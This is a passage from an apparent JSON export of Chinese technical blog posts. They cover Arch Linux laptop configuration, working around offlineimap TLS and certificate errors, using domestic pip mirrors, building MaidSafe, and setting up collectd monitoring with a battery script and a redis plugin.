。\n</p>\n\n<p>\n使用蓝牙音箱时，触模板必失灵，需要重启系统触模板才能恢复，暂未找到解决方案。\n</p>\n</li>\n</ul>\n\n<p>\n参考\n</p>\n\n<ul class=\"org-ul\">\n<li><a href=\"https://wiki.archlinux.org/index.php/Touchpad_Synaptics\">Touchpad Synaptics - ArchWiki</a>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-12\" class=\"outline-2\">\n<h2 id=\"sec-12\">指纹识别</h2>\n<div class=\"outline-text-2\" id=\"text-12\">\n<p>\n安装指纹识别模块\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S fprintd libfprint-git\n</pre>\n</div>\n\n<p>\n录入指纹\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">fprintd-enroll\n</pre>\n</div>\n\n<p>\n测试指纹\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">fprintd-verify\n</pre>\n</div>\n\n<p>\n多测试几次，如果效果不好则重新录入。\n</p>\n\n<p>\n锁定桌面，试试使用指纹解锁。\n</p>\n\n\n<p>\n参考\n</p>\n\n<ul class=\"org-ul\">\n<li><a href=\"https://github.com/ars3niy/fprint_vfs5011/issues/9\">Verify result always returning \"verify-no-match\" · Issue #9 · ars3niy/fprint_vfs5011</a>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-13\" class=\"outline-2\">\n<h2 id=\"sec-13\">定制 gnome3</h2>\n<div class=\"outline-text-2\" id=\"text-13\">\n<p>\n安装扩展\n</p>\n\n<ul class=\"org-ul\">\n<li>程序托盘图标回到屏幕右上角\n\n<p>\n<a href=\"https://extensions.gnome.org/extension/495/topicons/\">TopIcons</a>\n</p>\n</li>\n\n<li>窗口标题栏融入活动栏\n\n<p>\n<a href=\"https://extensions.gnome.org/extension/723/pixel-saver/\">Pixel Saver</a>\n</p>\n</li>\n</ul>\n\n<p>\n调试扩展\n</p>\n\n<ul class=\"org-ul\">\n<li>启动 Looking Glass\n\n<p>\n按快捷键 <code>Alt</code> + <code>F2</code> 输入 <code>lg</code>\n</p>\n</li>\n\n<li>切到 Extensions 页\n\n<p>\n找到出问题的插件，点击 Show Errors，一般是系统少安装了某些包，使用 pacman 安装即可\n</p>\n</li>\n\n<li>重新载入桌面\n\n<p>\n按快捷键 <code>Alt</code> + <code>F2</code> 输入 <code>r</code>\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-14\" class=\"outline-2\">\n<h2 id=\"sec-14\">避免启动后总是静音</h2>\n<div class=\"outline-text-2\" id=\"text-14\">\n<p>\n安装 alsa-utils，保存音量设置。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-15\" class=\"outline-2\">\n<h2 id=\"sec-15\">显卡驱动</h2>\n<div class=\"outline-text-2\" id=\"text-15\">\n<p>\n机器是双显卡，一块 Intel 的集显加上 Nvida 的独显。\n默认的开源显卡驱动也够用，使用 Nvida 的独显效果更好。\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pacman -S nvidia\n</pre>\n</div>\n<p>\n参考 <a href=\"http://blog.csdn.net/zhyh1986/article/details/39892611\">ArchLinux边用边记 - 竹叶青的专栏 - 博客频道 - CSDN.NET</a>\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-16\" class=\"outline-2\">\n<h2 id=\"sec-16\">蓝牙耳机</h2>\n<div class=\"outline-text-2\" id=\"text-16\">\n<p>\n安装相关软件包\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S pulseaudio-bluetooth bluez-firmware bluez-utils\n</pre>\n</div>\n\n<p>\n启动蓝牙服务\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl enable bluetooth\nsudo systemctl start bluetooth\n</pre>\n</div>\n\n<p>\n参考\n</p>\n<ul class=\"org-ul\">\n<li><a href=\"https://wiki.archlinux.org/index.php/Bluetooth_headset_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)\">Bluetooth headset (简体中文) - ArchWiki</a>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "修复 offlineimap 无法收邮件的问题",
  "timestamp": "2016-03-18 10:44:00",
  "tags": [
    "linux",
    "network",
    "python"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">不使用 ssl</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n.offlineimaprc 配置\n</p>\n<pre class=\"example\">\nssl = no\n</pre>\n\n\n<p>\nofflineimap 收邮件出错\n</p>\n<pre class=\"example\">\n$ offlineimap\n...\n Establishing connection to imap.xxxxxx.com:143\n ERROR: Could not connect via SSL to host 'imap.xxxxxx.com' and non-standard ssl port 143 configured. Make sure you connect to the correct port.\n...\n</pre>\n<p>\n意外地使用了 ssl 进行连接。\n</p>\n\n\n<p>\ntelnet 邮件服务器进行诊断\n</p>\n<pre class=\"example\">\n$ telnet imap.xxxxxx.com 143\nConnected to imap.xxxxxx.com.\nEscape character is '^]'.\n* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS] Courier-IMAP ready. Copyright 1998-2011 Double Precision, Inc.  See COPYING for distribution information.\n</pre>\n<p>\n输出的 CAPABILITY 包含 STARTTLS，应该是邮件服务器配置有误\n</p>\n\n\n<p>\n修改 offlineimap 的源代码文件 <a href=\"file:///usr/lib/python2.7/site-packages/offlineimap/imapserver.py\">imapserver.py</a> ，我们的邮箱不使用 tls\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\">269  <span style=\"color: #99cc99;\">def</span> <span style=\"color: #f99157;\">__start_tls</span>(<span style=\"color: #99cc99;\">self</span>, imapobj):\n270          <span style=\"color: #99cc99;\">if</span> <span style=\"color: #66cccc;\">'STARTTLS'</span> <span style=\"color: #99cc99;\">in</span> imapobj.capabilities <span style=\"color: #99cc99;\">and</span> <span style=\"color: #99cc99;\">not</span> <span style=\"color: #99cc99;\">self</span>.usessl:\n</pre>\n</div>\n\n<p>\n改成\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\">269  <span style=\"color: #99cc99;\">def</span> <span style=\"color: #f99157;\">__start_tls</span>(<span style=\"color: #99cc99;\">self</span>, imapobj):\n270          <span style=\"color: #99cc99;\">if</span> <span style=\"color: #66cccc;\">'STARTTLS'</span> <span style=\"color: #99cc99;\">in</span> imapobj.capabilities <span style=\"color: #99cc99;\">and</span> <span style=\"color: #99cc99;\">not</span> <span style=\"color: #99cc99;\">self</span>.usessl <span style=\"color: #99cc99;\">and</span> <span style=\"color: #99cc99;\">self</span>.<span style=\"text-decoration: underline;\">repos.account.name != </span><span style=\"color: #66cccc; text-decoration: underline;\">'xxxxxx'</span><span style=\"text-decoration: underline;\">:</span>\n</pre>\n</div>\n\n\n<ul class=\"org-ul\">\n<li>更好的做法\n\n<p>\n在 imap 协议许可的情况下，加强容错性，tls 连接失败后，使用普通连接重连。\n.offlineimaprc 新加禁用 tls 的配置项，警告用户服务器可能配置有误，提示用户禁用 tls。\n</p>\n</li>\n\n<li>相关的问题\n\n<p>\n<a href=\"https://github.com/OfflineIMAP/offlineimap/pull/54\">Optional TLS by mativs · Pull Request #54 · OfflineIMAP/offlineimap</a>\n</p>\n\n<p>\n有这个问题的 patch，但是没有下文。\n</p>\n</li>\n\n<li><a href=\"https://github.com/OfflineIMAP/offlineimap\">offlineimap</a> 新加的 starttls 选项解决了这个问题\n\n<pre class=\"example\">\ncommit ac2a547ec46d590d041d410723f90f45fcb802fe\nAuthor: Nicolas Sebrecht &lt;nicolas.s-dev@laposte.net&gt;\nDate:   Thu Jun 23 03:55:00 2016 +0200\n\nlearn to disable STARTTLS\n\nSome servers might have this feature broken.\n\nGithub-ref: https://github.com/OfflineIMAP/offlineimap/issues/207\nSigned-off-by: Nicolas Sebrecht &lt;nicolas.s-dev@laposte.net&gt;\n</pre>\n\n<p>\n在 .offlineimaprc 中添加禁用 starttls 配置项\n</p>\n<pre class=\"example\">\nstarttls = no\n</pre>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">使用 ssl</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n.offlineimaprc 配置\n</p>\n<pre class=\"example\">\nssl = yes\n</pre>\n\n\n<p>\nofflineimap 收邮件出错\n</p>\n<pre class=\"example\">\n$ offlineimap\n...\n Establishing connection to imap.xxxxxx.com:993\n ERROR: Unknown SSL protocol connecting to host 'imap.xxxxxx.com' for repository 'XxxxxxRemote'. OpenSSL responded:\n[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:590)\n...\n</pre>\n<p>\nssl 证书验证失败。\n</p>\n\n<p>\ncurl 邮件服务器进行诊断\n</p>\n<pre class=\"example\">\n$ curl https://imap.xxxxxx.com:993/\ncurl: (60) SSL certificate problem: self signed certificate\n</pre>\n<p>\n邮件服务器的 ssl 证书是自签名的\n</p>\n\n<p>\n从服务器提取证书\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">echo</span> | openssl s_client -connect imap.xxxxxx.com:993 2&gt;&amp;1 | sed -ne <span style=\"color: #66cccc;\">'/-BEGIN CER</span><span style=\"color: #66cccc; text-decoration: underline;\">TIFICATE-/,/-END CERTIFICATE-/p'</span><span style=\"text-decoration: underline;\"> &gt; ~/imap.xxxxxx.com.pem</span>\n</pre>\n</div>\n\n<p>\n.offlineimaprc 指定证书\n</p>\n<pre class=\"example\">\nssl = yes\nsslcacertfile = /home/xxxxxxxx/imap.xxxxxx.com.pem\n</pre>\n\n\n<p>\nofflineimap 收邮件出错\n</p>\n<pre class=\"example\">\n$ offlineimap\n...\n Establishing connection to imap.xxxxxx.com:993\n ERROR: Unknown SSL protocol connecting to host 'imap.xxxxxx.com' for repository 'XxxxxxRemote'. OpenSSL responded:\n[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:590)\n...\n</pre>\n<p>\nssl 证书验证失败。\n</p>\n\n<p>\ncurl 邮件服务器进行诊断\n</p>\n<pre class=\"example\">\n$ curl https://imap.xxxxxx.com:993/ --cacert /home/xxxxxxxx/imap.xxxxxx.com.pem\ncurl: (60) SSL certificate problem: certificate has expired\n</pre>\n<p>\n邮件服务器的 ssl 证书已过期。\n</p>\n\n\n<p>\n提取 ssl 证书指纹\n</p>\n<pre class=\"example\">\n$ openssl x509 -noout -in ~/imap.xxxxxx.com.pem -fingerprint -sha1\nSHA1 Fingerprint=XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX\n</pre>\n\n<p>\n.offlineimaprc 使用证书指纹\n</p>\n<pre class=\"example\">\nssl = yes\n#sslcacertfile = /home/xxxxxxxx/imap.xxxxxx.com.pem\ncert_fingerprint = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n</pre>\n<p>\n参考 <a href=\"https://github.com/OfflineIMAP/offlineimap/pull/8\">Adding support for multi-fingerprint IMAP servers by Kdecherf · Pull Request #8 · OfflineIMAP/offlineimap</a>\n</p>\n\n<p>\nofflineimap 收邮件出错\n</p>\n<pre class=\"example\">\n$ offlineimap\n Establishing connection to imap.xxxxxx.com:993\n ERROR: Unknown SSL protocol connecting to host 'imap.xxxxxx.com' for repository 'XxxxxxRemote'. OpenSSL responded:\n[SSL: SSL_NEGATIVE_LENGTH] dh key too small (_ssl.c:590)\n</pre>\n<p>\n邮件服务器的 openssl 可能太老了，生成的 DH KEY 文件只有 768 位不安全，需要重新生成更安全的 KEY 文件。\n参考 <a href=\"http://offlineimap-project.alioth.debian.narkive.com/dVTlxZyP/ssl-error-with-offlineimap-version-6-6-1-debian-package\">Ssl error with offlineimap version 6.6.1 (debian package)</a>\n</p>\n\n<p>\n使用 ssl 折腾失败，还是邮件服务器配置问题，除非 offlineimap 支持对服务器不进行安全验证，否则服务器端才能解决。</p>\n</div>\n</div>\n"
},
{
  "title": "使用国内镜像加速 pip",
  "timestamp": "2016-03-21 18:27:00",
  "tags": [
    "python"
  ],
  "body": "<p>\npip 官方镜像被墙，可以使用用国内镜像进行访问\n</p>\n\n<ul class=\"org-ul\">\n<li><a href=\"http://pypi.douban.com/simple/\">http://pypi.douban.com/simple/</a>\n</li>\n\n<li><a href=\"http://mirrors.aliyun.com/pypi/simple/\">http://mirrors.aliyun.com/pypi/simple/</a>\n</li>\n</ul>\n\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">命令行指定镜像</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pip install -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.ali<span style=\"text-decoration: underline;\">yun.com &lt;package&gt;</span>\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">配置文件指定镜像</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\npip 的配置文件为 <code>~/.pip/pip.conf</code>\n</p>\n\n<pre class=\"example\">\n[global]\nindex-url = http://mirrors.aliyun.com/pypi/simple/\n\n[install]\ntrusted-host = mirrors.aliyun.com\n</pre>\n\n<p>\n使用 pip 安装包时要使用 root 帐号，配置文件实际位置为 <code>/root/.pip/pip.conf</code> 。\n</p>\n\n<p>\n使用 <code>pip</code> <code>install</code> 命令安装包时，默认会使用配置文件中指定的镜像。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li><a href=\"http://www.isaced.com/post-228.html\">Pythoner的福利，豆瓣的PyPI源 - isaced</a>\n</li>\n\n<li><a href=\"http://www.cnblogs.com/yudar/p/4657511.html\">linux 设置pip 镜像 Pip Warning：–trusted-host 问题解决方案 - Yudar - 博客园</a>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "Archlinux 下编译 MaidSafe",
  "timestamp": "2016-03-30 16:26:00",
  "tags": [
    "p2p",
    "bitcion",
    "archlinux"
  ],
  "body": "<p>\n按照文档 <a href=\"https://github.com/maidsafe-archive/MaidSafe/wiki/Build-Instructions-for-Linux\">Build Instructions for Linux · maidsafe-archive/MaidSafe Wiki</a> 的指示进行。\n</p>\n\n<p>\n安装 icu-staticlibs 时，由于与已安装的 icu 软件包存在文件冲突，正常安装是装不了的，加上 <code>--force</code> 选项即可\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt --force -S icu-staticlibs\n</pre>\n</div>\n\n<p>\n编译 master 分枝会出错，切到 next 分枝再编译即可\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git submodule foreach <span style=\"color: #66cccc;\">\"git checkout next; git pull\"</span>\ngit checkout next; git pull\n</pre>\n</div>\n\n<p>\n参考\n</p>\n\n<ul class=\"org-ul\">\n<li><a href=\"https://github.com/maidsafe-archive/MaidSafe/issues/234\">make: <b>*</b> {ExperCommon} Error 2 · Issue #234 · maidsafe-archive/MaidSafe</a>\n</li>\n</ul>\n"
},
{
  "title": "使用 collectd 进行服务监控",
  "timestamp": "2016-03-31 12:39:00",
  "tags": [
    "linux",
    "collectd"
  ],
  "body": "<p>\ncollectd 的官网 <a href=\"https://collectd.org/\">collectd.org</a> 。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">collectd 服务</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>安装\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S collectd\n</pre>\n</div>\n</li>\n\n<li>启动\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl enable collectd\nsudo systemctl start collectd\n</pre>\n</div>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">collectd 界面</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n</div><div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"sec-2-1\"><a href=\"http://blog.kankanan.com/article/nginx-4e0b5feb901f642d5efa-php-8fd0884c73af5883.html\">nginx下快速搭建php运行环境</a></h3>\n</div>\n\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"sec-2-2\">安装 rrdtool</h3>\n<div class=\"outline-text-3\" id=\"text-2-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S rrdtool\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-3\" class=\"outline-3\">\n<h3 id=\"sec-2-3\">下载 GCP</h3>\n<div class=\"outline-text-3\" id=\"text-2-3\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">cd</span> /usr/share/nginx/html/\nsudo git clone https://github.com/pommi/CGP.git\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-4\" class=\"outline-3\">\n<h3 id=\"sec-2-4\">配置 GCP</h3>\n<div class=\"outline-text-3\" id=\"text-2-4\">\n<p>\n修改配置文件 /usr/share/nginx/html/CGP/conf/config.php\n</p>\n<pre class=\"example\">\n# collectd's datadir\n$CONFIG['datadir'] = '/var/lib/collectd/rrd';\n</pre>\n<p>\n改为\n</p>\n<pre class=\"example\">\n# collectd's datadir\n$CONFIG['datadir'] = '/var/lib/collectd';\n</pre>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-5\" class=\"outline-3\">\n<h3 id=\"sec-2-5\">打开界面</h3>\n<div class=\"outline-text-3\" id=\"text-2-5\">\n<p>\n浏览器打开页面 <a href=\"http://localhost/CGP/index.php\"><a href=\"http://localhost/CGP/index.php\">http://localhost/CGP/index.php</a></a> ，可以看到服务器自身的监控信息。\n</p>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">collectd 插件</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\ncollectd 支持很多 <a href=\"https://collectd.org/wiki/index.php/Table_of_Plugins\">插件</a> ，使用 c 语言开发插件请参考 <a href=\"https://collectd.org/wiki/index.php/Plugin_architecture\">Plugin architecture - collectd Wiki</a>。\n</p>\n\n<p>\n<a href=\"https://collectd.org/wiki/index.php/Plugin:Exec\">Exec</a> 插件使用 shell 脚本来收集系统监控数据。\n</p>\n\n<p>\n以监控电池电量为例。\n</p>\n</div>\n\n<div id=\"outline-container-sec-3-1\" class=\"outline-3\">\n<h3 id=\"sec-3-1\">启用 Exec 插件</h3>\n<div class=\"outline-text-3\" id=\"text-3-1\">\n<p>\n修改 collectd 配置文件 /etc/collectd.conf\n</p>\n<pre class=\"example\">\nLoadPlugin exec\n&lt;Plugin exec&gt;\n   Exec \"nobody:nobody\" \"/usr/bin/power-capacity\"\n&lt;/Plugin&gt;\n</pre>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3-2\" class=\"outline-3\">\n<h3 id=\"sec-3-2\">监控笔记本电量脚本</h3>\n<div class=\"outline-text-3\" id=\"text-3-2\">\n<p>\n<code>/usr/bin/power-capacity</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/</span><span style=\"color: #99cc99;\">bash</span>\n\n<span style=\"color: #ffcc66;\">HOSTNAME</span>=<span style=\"color: #66cccc;\">\"${COLLECTD_HOSTNAME:-localhost}\"</span>\n<span style=\"color: #ffcc66;\">INTERVAL</span>=<span style=\"color: #66cccc;\">\"${COLLECTD_INTERVAL:-60}\"</span>\n\n<span style=\"color: #99cc99;\">while</span> sleep <span style=\"color: #66cccc;\">\"$INTERVAL\"</span>; <span style=\"color: #99cc99;\">do</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #ffcc66;\">VALUE</span>=$(<span style=\"color: #cc99cc;\">echo</span> -n <span style=\"color: #cc99cc;\">`cat /sys/class/power_supply/BAT0/capacity`</span>)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"PUTVAL \\\"$HOSTNAME/power/capacity\\\" interval=$INTERVAL N:$VALUE\"</span>\n<span style=\"color: #99cc99;\">done</span>\n</pre>\n</div>\n\n<p>\n为脚本添加可执行权限\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo chmod a+x /usr/bin/power-capacity\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3-3\" class=\"outline-3\">\n<h3 id=\"sec-3-3\">重启 collectd 生效插件</h3>\n<div class=\"outline-text-3\" id=\"text-3-3\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl restart collectd\n</pre>\n</div>\n\n<p>\n过一会儿就可以在界面上看到电量监控项。\n</p>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">collectd 多机器监控</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n监控本机没有什么用处，通过 network 插件，可以将 collectd 配置为服务器或客户端。\n</p>\n\n<ul class=\"org-ul\">\n<li>collectd 服务器\n\n<p>\n接受 collectd 客户端的上报的数据。\n</p>\n</li>\n\n<li>collectd 客户端\n\n<p>\n上报数据到 collectd 服务器。\n</p>\n</li>\n</ul>\n</div>\n\n<div id=\"outline-container-sec-4-1\" class=\"outline-3\">\n<h3 id=\"sec-4-1\">本机配置为 collectd 服务器</h3>\n<div class=\"outline-text-3\" id=\"text-4-1\">\n<p>\n通过 <a href=\"https://collectd.org/documentation/manpages/collectd.conf.5.shtml#plugin_network\">network</a> 插件配置为 server 端。\n</p>\n\n<p>\n修改 collectd 配置文件 /etc/collectd.conf \n</p>\n<pre class=\"example\">\nLoadPlugin network\n\n&lt;Plugin network&gt;\n    &lt;Listen \"0.0.0.0\" \"25826\"&gt;\n        SecurityLevel Sign\n        AuthFile \"/etc/collectd/passwd\"\n    &lt;/Listen&gt;\n&lt;/Plugin&gt;\n</pre>\n\n<p>\n创建密码文件\n<code>/etc/collectd/passwd</code>\n</p>\n<pre class=\"example\">\nuser0: foo\nuser1: bar\n</pre>\n\n<p>\n重启 collectd 服务，生效配置。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4-2\" class=\"outline-3\">\n<h3 id=\"sec-4-2\">其它机器配置为 collectd 客户端</h3>\n<div class=\"outline-text-3\" id=\"text-4-2\">\n<p>\n参考前面的 <a href=\"#sec-1\">collectd 服务</a> 一节安装 collectd。\n</p>\n\n<p>\n通过 <a href=\"https://collectd.org/documentation/manpages/collectd.conf.5.shtml#plugin_network\">network</a> 插件配置为 client 端。\n</p>\n\n<p>\n修改 collectd 配置文件 /etc/collectd.conf \n</p>\n<pre class=\"example\">\nLoadPlugin network\n\n&lt;Plugin network&gt;\n    &lt;Server \"172.17.0.1\" \"25826\"&gt;\n        SecurityLevel Encrypt\n        Username \"user0\"\n        Password \"foo\"\n    &lt;/Server&gt;\n&lt;/Plugin&gt;\n</pre>\n<p>\n服务器的 IP 为 172.17.0.1。\n</p>\n\n<p>\n重启 collectd 服务，生效配置，等一会儿就可以在界面上看到客户端机器的监控信息。\n</p>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<ul class=\"org-ul\">\n<li><a href=\"https://github.com/pommi/CGP/blob/master/README.md\">CGP/README.md at master · pommi/CGP</a>\n</li>\n\n<li><a href=\"https://collectd.org/wiki/index.php/First_steps\">First steps - collectd Wiki</a>\n</li>\n\n<li><a href=\"http://www.drupal001.com/2012/07/system-monitor-collectd/\">Collectd详解、Collectd使用说明、Collectd中文说明 - 系统性能监控利器</a>\n</li>\n\n<li><a href=\"https://collectd.org/wiki/index.php/Plugin:Exec\">Plugin:Exec - collectd Wiki</a>\n</li>\n\n<li><a href=\"http://blog.sina.com.cn/s/blog_502c8cc40100pbgu.html\">collectd使用_新浪研发中心_新浪博客</a>\n</li>\n\n<li><a href=\"https://collectd.org/documentation/manpages/collectd.conf.5.shtml#global_options\">collectd.conf(5) – collectd – The system statistics collection daemon</a>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "Archlinux 的 collectd 支持监控 redis",
  "timestamp": "2016-03-31 17:44:00",
  "tags": [
    "redis",
    "archlinux",
    "collectd"
  ],
  "body": "<p>\nArchlinux 下使用 <code>pacman</code> 安装的 <code>collectd</code> 没有 redis 插件。\n</p>\n\n<p>\n查看 collectd 的 <a href=\"https://projects.archlinux.org/svntogit/community.git/tree/trunk/PKGBUILD?h=packages/collectd\">PKGBUILD</a> 文件，并未明令禁止 redis 插件，从源代码编译安装的话，只要系统装了 <code>hiredis</code> ，redis 插件应该就会自动启用。\n</p>\n\n<p>\n所以我们需要从源代码编译安装 <code>collectd</code> 软件包。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">安装 ABS</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<blockquote>\n<p>\nWhat is the Arch Build System?\n</p>\n\n<p>\nThe Arch Build System is a ports-like system for building and packaging software from source code. While pacman is the specialized Arch tool for binary package management (including packages built with the ABS), ABS is a collection of tools for compiling source into installable .pkg.tar.xz packages.    \n</p>\n</blockquote>\n<p>\n引用自 <a href=\"https://wiki.archlinux.org/index.php/Arch_Build_System\">Arch Build System - ArchWiki</a>\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S abs\nsudo abs\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">编译安装 collectd</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span class=\"linenr\">1: </span>yaourt -S hiredis\n<span class=\"linenr\">2: </span>cp -R /var/abs/community/collectd ~/\n<span class=\"linenr\">3: </span><span style=\"color: #cc99cc;\">cd</span> ~/collectd\n<span id=\"coderef-archlinux_makepkg\" class=\"coderef-off\"><span class=\"linenr\">4: </span>makepkg</span>\n<span class=\"linenr\">5: </span>yaourt -U ./collectd-5.5.1-2-x86_64.pkg.tar.xz\n</pre>\n</div>\n\n<dl class=\"org-dl\">\n<dt> 行 <a href=\"#coderef-archlinux_makepkg\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-archlinux_makepkg');\" onmouseout=\"CodeHighlightOff(this, 'coderef-archlinux_makepkg');\">4</a>  </dt><dd>如果报 <code>Missing dependencies</code> 错误则按提示使用 pacman 装上缺失的依赖项\n</dd>\n</dl>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">使用以前的 collectd 配置</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n重新安装 collectd 后，以前的配置保存在 <code>/etc/collectd.conf.pacsave</code> ，恢复一下\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo mv /etc/collectd.conf.pacsave /etc/collectd.conf\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">启用 collectd 插件</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n修改 collectd 配置文件 <code>/etc/collectd.conf</code> \n</p>\n<pre class=\"example\">\nLoadPlugin redis\n\n&lt;Plugin redis&gt;\n  &lt;Node \"db\"&gt;\n     Host \"127.0.0.1\"\n     Port \"6379\"\n     Timeout 2000\n  &lt;/Node&gt;\n&lt;/Plugin&gt;\n</pre>\n\n<p>\n重启 collectd 服务，现在可以在界面上看到 redis 的监控项了。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<ul class=\"org-ul\">\n<li><a href=\"http://arch.acgtyrant.com/2013/12/26/soul/\">Arch Linux 的靈魂：PKGBUILD、AUR 和 ABS | Tyrant's Arch Linux</a>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "勿用 redis 的多库",
  "timestamp": "2016-04-09 15:02:00",
  "tags": [
    "redis"
  ],
